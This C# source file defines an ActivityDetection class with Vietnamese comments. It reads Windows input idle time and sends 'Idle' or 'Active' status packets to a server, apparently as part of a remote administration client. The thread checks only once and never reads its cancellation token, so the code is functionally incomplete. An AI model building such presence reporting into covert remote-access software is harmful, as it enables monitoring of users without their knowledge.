using Client.Networking.Packets.ClientServices;
using Common.Enums;
using Common.Helper;

namespace Client.User
{
    using Client = Client.Networking.Client;

    public class ActivityDetection : IDisposable
    {
        private UserStatus _lastUserStatus;

        private readonly Client _client;
        private readonly CancellationTokenSource _tokenSource;
        private readonly CancellationToken _token;

        public ActivityDetection(Client client)
        {
            _client = client;
            _tokenSource = new CancellationTokenSource();
            _token = _tokenSource.Token;
            client.ClientState += OnClientStateChange;
        }

        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            if (connected)
                _lastUserStatus = UserStatus.Active;
        }

        public void Start()
        {
            new Thread(UserActivityThread).Start();
        }

        private void UserActivityThread()
        {
            try
            {
                if (IsUserIdle())// nếu ko hoạt động trong 10'
                {
                    if (_lastUserStatus != UserStatus.Idle)// nếu trạng thái trước đó ko phải idle
                    {
                        _lastUserStatus = UserStatus.Idle;// cập nhật lại trạng thái
                        _client.SendPacket(new UserStatusClientPacket { Message = _lastUserStatus });// gửi packet trạng thái lên server
                    }
                }
                else
                {
                    if (_lastUserStatus != UserStatus.Active)
                    {
                        _lastUserStatus = UserStatus.Active;
                        _client.SendPacket(new UserStatusClientPacket { Message = _lastUserStatus });
                    }
                }
            }
            catch (Exception e) when (e is NullReferenceException || e is ObjectDisposedException)
            {
            }
        }

        private bool IsUserIdle()
        {
            var ticks = Environment.TickCount;//số millisecond kể từ khi Windows khởi động.

            var idleTime = ticks - NativeMethodsHelper.GetLastInputInfoTickCount();//Lấy thời điểm hoạt động cuối cùng

            idleTime = ((idleTime > 0) ? (idleTime / 1000) : 0);// đổi sang giây

            return (idleTime > 600);// nếu không có hoạt động trong 10 phút (600 giây) thì coi là idle
        }

        public void Dispose()
        {
            _client.ClientState -= OnClientStateChange;
            _tokenSource.Cancel();
            _tokenSource.Dispose();

            GC.SuppressFinalize(this);
        }
    }
}
